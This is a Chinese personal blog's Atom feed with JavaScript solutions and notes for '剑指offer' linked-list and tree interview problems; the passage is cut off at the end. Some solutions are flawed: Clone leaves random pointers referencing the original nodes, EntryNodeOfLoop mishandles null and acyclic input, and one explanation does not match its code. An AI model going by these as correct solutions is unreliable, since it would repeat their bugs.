<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wangsiyuan</title>
  
  <subtitle>小马过河</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="wangsiyuan233.github.io/"/>
  <updated>2018-10-06T10:48:32.509Z</updated>
  <id>wangsiyuan233.github.io/</id>
  
  <author>
    <name>wangsiyuan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>剑指offer(1)--链表篇(JavaScript版)/共 题</title>
    <link href="wangsiyuan233.github.io/2018/10/06/80%E5%89%91%E6%8C%87-%E9%93%BE%E8%A1%A8%E7%AF%87/"/>
    <id>wangsiyuan233.github.io/2018/10/06/80剑指-链表篇/</id>
    <published>2018-10-06T03:09:54.000Z</published>
    <updated>2018-10-06T10:48:32.509Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>三、从尾到头打印链表 p58</p></blockquote><p><strong>描述</strong>：输入一个链表，按链表值从尾到头的顺序返回一个 <code>ArrayList</code>。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printListFromTailToHead</span>(<span class="params">head</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> p = head;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">while</span>(p)&#123;</div><div class="line">      <span class="comment">// unshift 需要添加到数组开头的元素。</span></div><div class="line">      <span class="comment">// val() 方法返回或设置被选元素的值。</span></div><div class="line">        result.unshift(p.val);</div><div class="line">        <span class="comment">// next() 获得匹配元素集合中每个元素紧邻的同胞元素</span></div><div class="line">        p = p.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/<code>unshift()</code>在数组的头部添加任意个项并返回新数组的长度</p><blockquote><p>十四、链表中倒数第k个结点 p134</p></blockquote><p><strong>描述</strong>：输入一个链表，输出该链表中倒数第k个结点。本题从 1 开始计数，即链表的尾节点是倒数第 1 个节点。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindKthToTail</span>(<span class="params">head, k</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//表头为空指针 和 k为 0  都会原地爆炸</span></div><div class="line">    <span class="keyword">var</span> p1 = head;</div><div class="line">    <span class="keyword">var</span> p2 = head;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;<span class="comment">// 链表的节点数要大于 K 吧</span></div><div class="line">        <span class="keyword">if</span> (p1.next != <span class="literal">null</span>) &#123;</div><div class="line">            p1 = p1.next;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (p1.next != <span class="literal">null</span>)&#123;</div><div class="line">        p1 = p1.next;</div><div class="line">        p2 = p2.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、可以从定义看出，本题中的链表是单向链表，单向链表的节点只有从前往后的指针而没有从后往前的指针，所以不能从末尾开始扫描；<br>2、我们只需要遍历两次，第一次统计链表中节点的个数，第二次找到倒数K节点，这个时候面试官摁住了你的手，只允许你遍历一次；<br>3、于是我们就设计了两个指针，同时也要考虑到指针为空等情况</p><blockquote><p>十五、反转链表 p142</p></blockquote><p><strong>描述</strong>：输入一个链表，反转链表后，输出新链表的表头。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReverseList</span>(<span class="params">pHead</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (pHead == <span class="literal">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> p1 = pHead;<span class="comment">//旧表的表头</span></div><div class="line">    <span class="keyword">var</span> p2 = <span class="literal">null</span>;<span class="comment">//新表的表头就是旧表的表尾，现在为空</span></div><div class="line">        temp = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">while</span> (p1) &#123;</div><div class="line">      <span class="comment">// 链表的反转 和 左右子树的交换，都需要左右手</span></div><div class="line">        temp = p1.next;</div><div class="line">        p1.next = p2;</div><div class="line">        p2 = p1;</div><div class="line">        p1 = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、解决链表相关的工作时，我们总需要大量的指针；<br>2、需要三个指针：分别指向当前遍历到的节点、它的前一个节点及后一个节点；<br>3、尾节点就是 <code>p.next</code> 为空的节点<br>4、左右手互换</p><blockquote><p>十六、合并两个排序的链表 p145</p></blockquote><p><strong>描述</strong>：输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function Merge(pHead1, pHead2)&#123;</div><div class="line">    <span class="keyword">if</span> (pHead1 == <span class="literal">null</span> || pHead2 == <span class="literal">null</span>) &#123; <span class="comment">//判断是不是空链表</span></div><div class="line">        <span class="keyword">return</span> pHead1 || pHead2;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> head = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span> (pHead1.<span class="keyword">val</span> &lt; pHead2.<span class="keyword">val</span>) &#123;</div><div class="line">        head = pHead1;</div><div class="line">        head.next = Merge(pHead2,pHead1.next)</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        head = pHead2;</div><div class="line">        head.next = Merge(pHead1, pHead2.next);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> head;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：是递归</p><blockquote><p>二十五、复杂链表的复制 p187</p></blockquote><p><strong>描述</strong>：输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的head。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空）<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Clone</span></span>(pHead) &#123;</div><div class="line">    <span class="keyword">if</span> (!pHead) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">new</span><span class="type">Head</span> = <span class="keyword">new</span> <span class="type">RandomListNode</span>(pHead.label);</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.random = pHead.random;</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.next = Clone(pHead.next);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">Head</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br><img src="https://i.imgur.com/3ae3VAT.png" alt=""><br>1、遍历链表，复制每个结点，如复制结点A得到A1，将结点A1插到结点A后面；<br>2、重新遍历链表，复制老结点的随机指针给新结点，如A1.random = A.random.next;<br>3、拆分链表，将链表拆分为原链表和复制后的链表</p><blockquote><p>三十六、两个链表的第一个公共结点 p253</p></blockquote><p><strong>描述</strong>：输入两个链表，找出它们的第一个公共结点。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function FindFirstCommonNode(pHead1, pHead2)&#123;</div><div class="line">    var p1=pHead1;</div><div class="line">    var p2=pHead2;</div><div class="line">    while(p1!=p2)&#123;</div><div class="line">      // 先判断后面一个等号</div><div class="line">      // 第一个链表的头部如果不存在，就等于第二个链表的头部；如果存在，头部就等于自己的下一个元素</div><div class="line">        p1= p1==null?pHead2:p1.next;</div><div class="line">        p2= p2==null?pHead1:p2.next;</div><div class="line">    &#125;</div><div class="line">   <span class="built_in"> return </span>p1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、只有谈到链表，就会有head<br>2、JS没有用到书上说的比较长度的方法<br>3、本题是用 栈 的特点来解决；<br>4、分别把两个链表的节点放到两个栈中，这样两个链表的尾节点就位于两个栈的栈顶，接下来比较两个栈顶的节点是否相同；<br>5、如果相同，则把栈顶弹出，接着比较下一个栈顶，直到找到最后一个相同的节点。</p><blockquote><p>四十六、圆圈中最后剩下的数 p300</p></blockquote><p><strong>描述</strong>：0,1,2,3,4,5…n-1这n个数字排成一个圆圈，从数字 0 开始，每次从这个圆圈里删除第 m 个数字。求出这个圆圈里剩下的最后一个数字。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">LastRemaining_Solution</span><span class="params">(n, m)</span></span>&#123;</div><div class="line">  <span class="keyword">if</span>(n&lt;<span class="number">1</span>||m&lt;<span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">array</span> = [];</div><div class="line">  <span class="keyword">var</span> i = <span class="number">-1</span>,step = <span class="number">0</span>, count = n;</div><div class="line">  <span class="keyword">while</span>(count&gt;<span class="number">0</span>)&#123;   <span class="comment">//跳出循环时将最后一个元素也设置为了-1</span></div><div class="line">      i++;          <span class="comment">//指向上一个被删除对象的下一个元素。</span></div><div class="line">      <span class="keyword">if</span>(i&gt;=n) i=<span class="number">0</span>;  <span class="comment">//模拟环。</span></div><div class="line">      <span class="keyword">if</span>(<span class="keyword">array</span>[i] == <span class="number">-1</span>) <span class="keyword">continue</span>; <span class="comment">//跳过被删除的对象。</span></div><div class="line">      step++;                     <span class="comment">//记录已走过的。</span></div><div class="line">      <span class="keyword">if</span>(step==m)&#123;               <span class="comment">//找到待删除的对象。</span></div><div class="line">          <span class="keyword">array</span>[i]=<span class="number">-1</span>;</div><div class="line">          step = <span class="number">0</span>;</div><div class="line">          count--;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> i;<span class="comment">//返回跳出循环时的i,即最后一个被设置为-1的元素</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、用环形链表模拟圆圈，缺点是需要一个辅助链表<br>2、需要遍历很多遍，占用内存</p><blockquote><p>五十五、链表中环的入口结点 p139</p></blockquote><p><strong>描述</strong>：给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function EntryNodeOfLoop(pHead)&#123;</div><div class="line">    <span class="keyword">if</span>(pHead == <span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</div><div class="line">    <span class="keyword">if</span>(pHead.next == <span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</div><div class="line">    <span class="keyword">var</span> fast = pHead;</div><div class="line">    <span class="keyword">var</span> slow = pHead;</div><div class="line">    <span class="comment">//找到一快一满指针相遇处的节点，相遇的节点一定是在环中</span></div><div class="line">    <span class="keyword">while</span>(slow != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</div><div class="line">        slow = slow.next;</div><div class="line">        fast = fast.next.next;</div><div class="line">        <span class="keyword">if</span>(fast == slow) <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> p1 = slow;</div><div class="line">    <span class="keyword">var</span> p2 = pHead;</div><div class="line">    <span class="comment">// 移动p1，p2</span></div><div class="line">    <span class="keyword">while</span>(p1 != p2)&#123;</div><div class="line">        p1 = p1.next;</div><div class="line">        p2 = p2.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、第一步确定有没有环：定义两个指针同时出发，一个快一个慢，走的快的追上了走得慢的，就代表里面有环，如果快的到来链尾都没追上，就没环；<br>2、第二步找入口：如果链表中的环有 n 个节点，那么第一个指针就比第二个指针先出发 n,相同的速度移动，指针2在入口时，指针1已结绕着入口一圈，也停在了入口</p><blockquote><p>五十六、删除链表中重复的结点  ？？？ T50 p39 重复的数字</p></blockquote><p><strong>描述</strong>：在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteDuplication</span></span>(pHead)&#123;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">new</span><span class="type">Head</span> = <span class="keyword">new</span> <span class="type">ListNode</span>(<span class="string">'head'</span>);</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.next = pHead;</div><div class="line">    <span class="keyword">var</span> pHead = <span class="keyword">new</span><span class="type">Head</span>;</div><div class="line">    <span class="keyword">var</span> qHead = pHead.next;</div><div class="line">    <span class="keyword">while</span>(qHead) &#123;</div><div class="line">        <span class="keyword">while</span>((qHead.next!=<span class="literal">null</span>) &amp;&amp; (qHead.val == qHead.next.val)) &#123;</div><div class="line">            qHead = qHead.next;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//没移动</span></div><div class="line">        <span class="keyword">if</span>(pHead.next == qHead)&#123;</div><div class="line">            pHead = qHead;</div><div class="line">            qHead = qHead.next;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//移动了</span></div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            qHead = qHead.next;</div><div class="line">            pHead.next = qHead;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">Head</span>.next;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;三、从尾到头打印链表 p58&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述&lt;/strong&gt;：输入一个链表，按链表值从尾到头的顺序返回一个 &lt;code&gt;ArrayList&lt;/code&gt;。&lt;br&gt;&lt;figure class=&quot;hig
      
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>剑指offer(2)--JavaScript版(T12-T22)</title>
    <link href="wangsiyuan233.github.io/2018/10/05/79%E5%89%91%E6%8C%87offer-2/"/>
    <id>wangsiyuan233.github.io/2018/10/05/79剑指offer-2/</id>
    <published>2018-10-05T07:20:59.000Z</published>
    <updated>2018-10-06T07:06:48.790Z</updated>
    
    <content type="html"><![CDATA[<p>【<a href="https://github.com/wangsiyuan233/NowCoder" target="_blank" rel="external">源码地址</a>】 || 【<a href="https://www.nowcoder.com/ta/coding-interviews?page=1" target="_blank" rel="external">代码调试</a>】</p><blockquote><p>十二、数值的整数次方 p110</p></blockquote><p><strong>描述</strong>：给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Power</span>(<span class="params">x,n</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(n &lt; <span class="number">0</span>) &#123; <span class="comment">//指数 n 小于 0</span></div><div class="line">        <span class="keyword">if</span>(x &lt;= <span class="number">0</span>) &#123; <span class="comment">//底数 x 小于等于 0</span></div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"分母不能小于等于0"</span>);</div><div class="line">        &#125;<span class="keyword">else</span> &#123; <span class="comment">//底数 x 大于 0</span></div><div class="line">            <span class="keyword">if</span>(-n % <span class="number">2</span> == <span class="number">1</span>) &#123; <span class="comment">//指数 n 的绝对值是奇数</span></div><div class="line">              <span class="keyword">return</span> <span class="number">1</span>/(Power(x,-n<span class="number">-1</span>) * x);</div><div class="line">            &#125;<span class="keyword">else</span> &#123;<span class="comment">//指数 n 的绝对值是偶数</span></div><div class="line">              <span class="keyword">var</span> r = <span class="number">1</span>/Power(x,-n/<span class="number">2</span>);</div><div class="line">            <span class="keyword">return</span> r * r;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>) &#123;<span class="comment">//指数 n 等于 0</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;<span class="comment">//指数 n 大于 0</span></div><div class="line">        <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">1</span>) &#123; <span class="comment">//指数 n 是奇数</span></div><div class="line">            <span class="keyword">return</span> Power(x,n<span class="number">-1</span>) * x;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;<span class="comment">//指数 n 是偶数</span></div><div class="line">            <span class="keyword">var</span> r = Power(x,n/<span class="number">2</span>);</div><div class="line">            <span class="keyword">return</span> r * r;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：分类讨论<br><a id="more"></a></p><blockquote><p>十三、调整数组顺序使奇数位于偶数前面 </p></blockquote><p><strong>描述</strong>：输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function reOrderArray(<span class="built_in">array</span>)&#123;</div><div class="line">    <span class="built_in">var</span> arr1=[],arr2=[];</div><div class="line">    <span class="keyword">for</span>(<span class="built_in">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">array</span>.<span class="built_in">length</span>;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[i]<span class="symbol">%</span><span class="number">2</span>!=<span class="number">0</span>)&#123;</div><div class="line">          arr1.<span class="built_in">push</span>(<span class="built_in">array</span>[i]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">          arr2.<span class="built_in">push</span>(<span class="built_in">array</span>[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> arr1.<span class="built_in">concat</span>(arr2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/设置两个空数组，<code>push() + concat()</code></p><blockquote><p>十四、链表中倒数第k个结点 p134</p></blockquote><p><strong>描述</strong>：输入一个链表，输出该链表中倒数第k个结点。本题从 1 开始计数，即链表的尾节点是倒数第 1 个节点。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindKthToTail</span>(<span class="params">head, k</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//表头为空指针 和 k为 0  都会原地爆炸</span></div><div class="line">    <span class="keyword">var</span> p1 = head;</div><div class="line">    <span class="keyword">var</span> p2 = head;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;<span class="comment">// 链表的节点数要大于 K 吧</span></div><div class="line">        <span class="keyword">if</span> (p1.next != <span class="literal">null</span>) &#123;</div><div class="line">            p1 = p1.next;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (p1.next != <span class="literal">null</span>)&#123;</div><div class="line">        p1 = p1.next;</div><div class="line">        p2 = p2.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、可以从定义看出，本题中的链表是单向链表，单向链表的节点只有从前往后的指针而没有从后往前的指针，所以不能从末尾开始扫描；<br>2、我们只需要遍历两次，第一次统计链表中节点的个数，第二次找到倒数K节点，这个时候面试官摁住了你的手，只允许你遍历一次；<br>3、于是我们就设计了两个指针，同时也要考虑到指针为空等情况</p><blockquote><p>十五、反转链表 p142</p></blockquote><p><strong>描述</strong>：输入一个链表，反转链表后，输出新链表的表头。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReverseList</span>(<span class="params">pHead</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (pHead == <span class="literal">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> p1 = pHead;<span class="comment">//旧表的表头</span></div><div class="line">    <span class="keyword">var</span> p2 = <span class="literal">null</span>;<span class="comment">//新表的表头就是旧表的表尾，现在为空</span></div><div class="line">        temp = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">while</span> (p1) &#123;</div><div class="line">      <span class="comment">// 链表的反转 和 左右子树的交换，都需要左右手</span></div><div class="line">        temp = p1.next;</div><div class="line">        p1.next = p2;</div><div class="line">        p2 = p1;</div><div class="line">        p1 = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、解决链表相关的工作时，我们总需要大量的指针；<br>2、需要三个指针：分别指向当前遍历到的节点、它的前一个节点及后一个节点；<br>3、尾节点就是 <code>p.next</code> 为空的节点<br>4、左右手互换</p><blockquote><p>十六、合并两个排序的链表 p145</p></blockquote><p><strong>描述</strong>：输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function Merge(pHead1, pHead2)&#123;</div><div class="line">    <span class="keyword">if</span> (pHead1 == <span class="literal">null</span> || pHead2 == <span class="literal">null</span>) &#123; <span class="comment">//判断是不是空链表</span></div><div class="line">        <span class="keyword">return</span> pHead1 || pHead2;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> head = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span> (pHead1.<span class="keyword">val</span> &lt; pHead2.<span class="keyword">val</span>) &#123;</div><div class="line">        head = pHead1;</div><div class="line">        head.next = Merge(pHead2,pHead1.next)</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        head = pHead2;</div><div class="line">        head.next = Merge(pHead1, pHead2.next);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> head;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：递归</p><blockquote><p>十七、树的子结构 p148</p></blockquote><p><strong>描述</strong>：输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 第一步判断 大树 和 小树 的左右腿长度都是一样的吧？</span></div><div class="line">function HasSubtree(pRoot1, pRoot2)&#123; </div><div class="line">   <span class="comment">//当 大树 和 小树 都不为零的时候，才进行比较。否则直接返回false</span></div><div class="line">   <span class="keyword">if</span> (pRoot1 == <span class="literal">null</span> || pRoot2 == <span class="literal">null</span>)&#123;</div><div class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">   &#125;</div><div class="line">    <span class="keyword">return</span> isSubtree(pRoot1, pRoot2)</div><div class="line">    <span class="comment">//如果找不到，那么就再去root的左儿子当作起点，去判断时候包含 小 树</span></div><div class="line">        || HasSubtree(pRoot1.left, pRoot2)</div><div class="line">    <span class="comment">//如果还找不到，那么就再去root的右儿子当作起点，去判断时候包含 大 树</span></div><div class="line">        || HasSubtree(pRoot1.right, pRoot2);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 第二步判断两棵树是否有相同的值</span></div><div class="line">function isSubtree(root1, root2)&#123; </div><div class="line">    <span class="comment">//如果小树已经遍历完了都能对应的上，返回true</span></div><div class="line">    <span class="keyword">if</span> (root2 == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="comment">//如果小树还没有遍历完，大树却遍历完了。返回false</span></div><div class="line">    <span class="keyword">if</span> (root1 == <span class="literal">null</span>) <span 